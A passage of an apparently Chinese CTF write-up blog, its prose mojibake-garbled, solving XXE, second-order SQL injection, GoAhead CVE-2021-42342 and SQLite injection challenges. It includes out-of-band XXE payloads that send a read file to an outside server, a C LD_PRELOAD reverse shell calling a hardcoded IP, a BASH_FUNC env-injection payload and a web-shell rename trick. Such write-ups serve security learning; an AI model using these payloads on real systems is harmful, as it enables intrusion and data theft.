</span><br><span class="line">        String saveFilename = makeFileName(filename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;saveFilename&quot;</span>, saveFilename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;filename&quot;</span>, filename);</span><br><span class="line">        String realSavePath = makePath(saveFilename, savePath);</span><br><span class="line">        FileOutputStream out = <span class="keyword">new</span> FileOutputStream(realSavePath + <span class="string">&quot;/&quot;</span> + saveFilename);</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">          out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">        message = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ!&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileUploadException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    request.setAttribute(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/ListFileServlet&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">private</span> String <span class="title">makeFileName</span><span class="params">(String filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> UUID.randomUUID().toString() + <span class="string">&quot;_&quot;</span> + filename;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">private</span> String <span class="title">makePath</span><span class="params">(String filename, String savePath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">    <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    String dir = savePath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">    File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists())</span><br><span class="line">      file.mkdirs(); </span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åšé¢˜-2"><a href="#åšé¢˜-2" class="headerlink" title="åšé¢˜"></a>åšé¢˜</h3><p>æ–°å»ºä¸€ä¸ªxlsxæ–‡ä»¶å¹¶è§£å‹ï¼ˆå»ºè®®åœ¨linuxç¯å¢ƒä¸‹è§£å‹å’Œå‹ç¼©</p>
<p>åœ¨<code>[Content_Types].xml</code>ç¬¬äºŒè¡Œæ’å…¥xxe payload</p>
<p>æµ‹è¯•ï¼šï¼ˆåœ¨vpsä¸Šç›‘å¬ï¼Œå¯ä»¥è·å–åˆ°ackä¿¡æ¯</p>
<p><a href="https://www.jianshu.com/p/73cd11d83c30">Apache POI XMLå¤–éƒ¨å®ä½“ï¼ˆXML External Entityï¼ŒXXEï¼‰æ”»å‡»è¯¦è§£ - ç®€ä¹¦ (jianshu.com)</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps:3000/ack&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/1578e95334c4465399e19e121d589daf.png" alt="image-20220625185626131"></p>
<p><a href="https://blog.csdn.net/m0_49835838/article/details/122718372">https://blog.csdn.net/m0_49835838/article/details/122718372</a></p>
<p>payloadï¼š</p>
<p><code>[Content_Types].xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;http://vps/ameuu.dtd&#x27;</span>&gt;</span> %test; %exe; %entity;]&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>ameuu.dtd</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">exe</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; entity SYSTEM &#x27;http://vps/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨æ—¥å¿—æ–‡ä»¶é‡Œå¯ä»¥æ‰¾åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/21ed885db5a043e5aeaa049021a058a0.png" alt="image-20220625192258429"></p>
<h2 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h2><ul>
<li>ä¿¡æ¯æ³„éœ²</li>
<li>update æ³¨å…¥</li>
<li>äºŒæ¬¡æ³¨å…¥</li>
</ul>
<p><code>www.tar.gz</code></p>
<h4 id="å®¡è®¡ï¼š"><a href="#å®¡è®¡ï¼š" class="headerlink" title="å®¡è®¡ï¼š"></a>å®¡è®¡ï¼š</h4><p><code>index.php</code>ä¸­æ²¡æœ‰å¤ªå¤šæœ‰ç”¨çš„ä¿¡æ¯ï¼Œè€Œ<code>common.inc.php</code>ä¸­æ•°æ®åº“ä¿¡æ¯ä¸”åˆ©ç”¨phpè¿æ¥æ•°æ®åº“ï¼ŒåŒæ—¶å°†GETã€POSTã€COOKIEæ•°ç»„ä¸­çš„å€¼çš„ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬ä¹‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$req</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>, <span class="variable">$_COOKIE</span>) <span class="keyword">as</span> <span class="variable">$global_var</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$global_var</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		is_string(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$req</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>upload.php</code></p>
<p>è§„å®šäº†åç¼€å</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;txt&quot;</span>))) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;error extension&quot;</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>sqlæŸ¥è¯¢ä¹‹å‰å¯¹æ–‡ä»¶åè¿›è¡Œè½¬ä¹‰ï¼Œåœ¨åç»­çš„æ’å…¥ä¿¡æ¯ä¸­ä¹Ÿä¼šå½±å“ï¼Œå°±ä¼šå¾ˆéš¾åˆ©ç”¨sqlæ³¨å…¥ï¼Œå¦‚æœä¸Šä¼ æˆåŠŸåˆ™å°†æ–‡ä»¶ç›®å½•è¾“å‡º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>] = addslashes(<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27; and `extension`=&#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ’å…¥çš„æ—¶å€™ä¿å­˜çš„æ–‡ä»¶åä¸åŒ…æ‹¬åç¼€å</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27;, 0, &#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>rename.php</code></p>
<p>ä¼šå…ˆåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™ç»§ç»­</p>
<p>å…³é”®ä»£ç ï¼šè¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°<code>oldname</code>å¯¹åº”çš„å€¼å¹¶ä¸ä¼šè¢«è½¬ä¹‰ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸€å¼€å§‹ä¼ å…¥çš„æ–‡ä»¶åœ¨æœç´¢åˆ°ä¹‹åä¼šä»¥åŸæ¥çš„å½¢å¼å‡ºç°ï¼ˆé€ æˆäº†äºŒæ¬¡æ³¨å…¥ï¼Œå¹¶ä¸”ä¼šåœ¨åé¢åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±é‡å‘½å</p>
<p>é‚£ä¹ˆæ³¨å…¥ç‚¹å°±æ˜¯åœ¨è¿™é‡Œäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = basename(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]); <span class="comment">// shell.jpg &#x27;,extension=&#x27; shell.php</span></span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">	print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$oldname</span> = UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"><span class="variable">$newname</span> = UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>]; <span class="comment">// shell.jpg.jpg</span></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">	rename(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="åšé¢˜ï¼š"><a href="#åšé¢˜ï¼š" class="headerlink" title="åšé¢˜ï¼š"></a>åšé¢˜ï¼š</h4><p>å…³é”®payloadï¼š<code>&#39;,extension=&#39;</code></p>
<p>æ–°å»ºä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œæ–‡ä»¶åä¸º<code>&#39;,extension=&#39;.jpg</code></p>
<p>ä¸Šä¼ æˆåŠŸä¹‹ååœ¨<code>rename</code>å¤„å°†<code>&#39;,extension=&#39;</code>ä¿®æ”¹æˆ<code>shell.jpg</code>ï¼Œå› ä¸ºrenameä¸€å¼€å§‹æŸ¥è¯¢æ–‡ä»¶ä¿¡æ¯çš„æ—¶å€™å¾—åˆ°<code>$result</code>ï¼Œå¹¶ä¸”æ•°æ®è¢«æ‹¿å‡ºæ¥çš„æ—¶å€™å¹¶ä¸ä¼šè¢«è½¬ä¹‰æ‰€ä»¥<code>$result[&#39;filename&#39;]=&#39;,extension=&#39;</code>ï¼Œå¯¼è‡´åœ¨ä¹‹åçš„updateè¯­å¥ä¸­å®ç°äº†sqlæ³¨å…¥ï¼Œæ›´æ–°çš„å†…å®¹å˜æˆï¼š</p>
<table>
<thead>
<tr>
<th>fid</th>
<th>newname</th>
<th>oldname</th>
<th>extension</th>
</tr>
</thead>
<tbody><tr>
<td>ï¼Ÿ</td>
<td>shell.jpg</td>
<td>null</td>
<td>null</td>
</tr>
</tbody></table>
<p>ä½†è¿™åªæ˜¯ä¿®æ”¹äº†æ•°æ®åº“çš„å†…å®¹ï¼Œåœ¨åç»­çš„<code>file_exists</code>è¿˜æ˜¯ä¼šæ£€æµ‹åˆ°<code>&#39;,extension=&#39;.jpg</code>æ–‡ä»¶å­˜åœ¨ï¼Œå®ç°æ–‡ä»¶åæ”¹æˆäº†<code>shell.jpg.jpg</code></p>
<p>åˆ›å»ºä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œæ–‡ä»¶åä¸º<code>shell.jpg</code>ï¼Œä¸Šä¼ æˆåŠŸåå°†<code>shell.jpg</code>æ”¹æˆ<code>shell.php</code>ï¼Œå› ä¸ºåœ¨renameçš„æ—¶å€™ç›´æ¥æŸ¥è¯¢<code>shell.jpg</code>æ˜¯èƒ½å¤ŸæŸ¥åˆ°ä¸œè¥¿çš„ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢æ‰€åˆ—å‡ºæ¥çš„è¡¨ï¼Œå¹¶ä¸”<code>$resulr[&#39;extension&#39;]=&#39;&#39;</code>ï¼Œæ‰€ä»¥åœ¨åé¢æ‰§è¡Œ<code>rename</code>å‡½æ•°çš„ä¹‹åæ‰§è¡Œä¸º=&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename(&#x27;shell.jpg&#x27;,&#x27;shell.php&#x27;)</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå®Œæˆäº†ä¿®æ”¹ï¼Œè®¿é—®<code>shell.php</code>å‘½ä»¤æ‰§è¡Œ</p>
<h2 id="ACTF-2022-gogogo"><a href="#ACTF-2022-gogogo" class="headerlink" title="[ACTF 2022]gogogo"></a>[ACTF 2022]gogogo</h2><ul>
<li>goahead</li>
<li>cve-2021-42342</li>
</ul>
<p><a href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html</a></p>
<p><a href="https://paper.seebug.org/1808/#_5">https://paper.seebug.org/1808/#_5</a></p>
<p><a href="https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg">https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg</a></p>
<h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><p>ç›´æ¥åœ¨urlä¸Šgetè¯·æ±‚LD_PRELOAD=testï¼Œå¯ä»¥å‘ç°envé¡µé¢å‡ºç°äº†<code>CGI_LD_PRELOAD=test</code>è¯´æ˜å­˜åœ¨æ¼æ´ç›´æ¥æ ¹æ®Pç¥çš„åšå®¢æŒ‰é¡ºåºæ‰“å°±å¥½äº†</p>
<p>pythonä¸Šä¼ æ–‡ä»¶ï¼šï¼ˆä¸Šä¼ ä¹‹åéœ€è¦ä¿®æ”¹Content-Lengthå¹¶åœ¨æ–‡ä»¶å†…å®¹åé¢åŠ ä¸Š2000ä¸ªè„å­—ç¬¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &#x27;http://82.156.2.166:10218/cgi-bin/hello&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://123.60.84.229:10218/cgi-bin/hello&#x27;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">     data = f.read()</span><br><span class="line"> files = &#123;<span class="string">&#x27;file&#x27;</span>: data&#125;</span><br><span class="line"><span class="comment"># print(files)</span></span><br><span class="line"><span class="comment"># boundary = &#x27;----%s&#x27; % str(random.randint(1000000000000, 9999999999999))</span></span><br><span class="line"><span class="comment"># padding = &#x27;a&#x27; * 2000</span></span><br><span class="line"><span class="comment"># data = fr&#x27;&#x27;&#x27;POST /cgi-bin/hello HTTP/1.1</span></span><br><span class="line"><span class="comment"># Host: 82.156.2.166:10218</span></span><br><span class="line"><span class="comment"># Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment"># Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment"># Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span></span><br><span class="line"><span class="comment"># Connection: close</span></span><br><span class="line"><span class="comment"># Content-Type: multipart/form-data; boundary=&#123;boundary&#125;</span></span><br><span class="line"><span class="comment"># Content-Length: 15000</span></span><br><span class="line"><span class="comment"># --&#123;boundary&#125;</span></span><br><span class="line"><span class="comment"># Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;;\</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># /proc/self/fd/7</span></span><br><span class="line"><span class="comment"># --&#123;boundary&#125;</span></span><br><span class="line"><span class="comment"># Content-Disposition: form-data; name=&quot;data&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment"># Content-Type: text/plain\</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># #payload#&#123;padding&#125;</span></span><br><span class="line"><span class="comment"># --&#123;boundary&#125;--</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;.replace(&#x27;\n&#x27;, &#x27;\r\n&#x27;)</span></span><br><span class="line"></span><br><span class="line"> r = requests.post(url, files=files)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/546367d4826a4801b72b8ce4b997a8f6.png" alt="image-20220625115827348"></p>
<p><img src="https://img-blog.csdnimg.cn/aa0de79d881044818a864151564c45a0.png" alt="image-20220625144058604"></p>
<p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç›´æ¥æŒ‰ç…§Pç¥æ­¥éª¤æ¥ï¼Œä½†æ˜¯è¿™é‡Œçš„<code>LD_PRELOAD</code>æŒ‡å‘çš„æ–‡ä»¶è¿˜æ˜¯è¦è‡ªå·±æ‰‹åŠ¨æ‰¾ä¸€ä¸‹å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œå¯¼è‡´Pç¥ç»™çš„è„šæœ¬å¹¶ä¸é€šç”¨</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *server_ip=<span class="string">&quot;82.156.2.166&quot;</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> server_port=<span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  attacker_addr.sin_family = AF_INET;</span><br><span class="line">  attacker_addr.sin_port = htons(server_port);</span><br><span class="line">  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">1</span>);</span><br><span class="line">  dup2(sock, <span class="number">2</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACTF&#123;s1mple_3nv_1nj3ct1on_and_w1sh_y0u_hav3_a_g00d_tim3_1n_ACTF2022&#125;</span><br></pre></td></tr></table></figure>

<h4 id="BASH"><a href="#BASH" class="headerlink" title="BASH"></a>BASH</h4><p><img src="https://img-blog.csdnimg.cn/ebf69f1fd95d409ca7fcf040fb8cab31.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://123.60.84.229:10218/cgi-bin/hello&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;BASH_FUNC_env%%&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;() &#123; id;&#125;&quot;</span>)&#125;</span><br><span class="line">r = requests.post(url, files=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ³¨æ„ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/d5078fc7c5054e93b948533ae6ca8a3f.png" alt="img"></p>
</blockquote>
<h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><p>å¼€å±€ç»™æŠ•ç¥¨çš„æºç å’Œæ•°æ®åº“å†…å®¹ï¼Œå¯ä»¥çŸ¥é“flagå°±åœ¨æ•°æ®åº“ä¸­ï¼Œè€Œidå­˜åœ¨sqlæ³¨å…¥ï¼Œä½†æ˜¯banæ‰äº†å¾ˆå¤šç‰¹æ®Šå­—ç¬¦å’Œå…³é”®è¯ï¼Œæ„Ÿè§‰åªèƒ½åˆ©ç”¨ç›²æ³¨äº†</p>
<p><code>+</code>è¢«banäº†å¯¼è‡´ä¸èƒ½ç”¨ç©ºæ ¼ï¼Œè€Œä¸”<code>/**/</code>ä¹Ÿä¸èƒ½ç”¨ï¼Œæ‰€ä»¥åªèƒ½ç”¨æ‹¬å·äº†ç»•è¿‡äº†</p>
<p><code>vote.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid(<span class="variable">$id</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p><a href="https://xz.aliyun.com/t/6628#toc-4">https://xz.aliyun.com/t/6628#toc-4</a></p>
<p>å‡ºé¢˜äººçš„è„šæœ¬ï¼š</p>
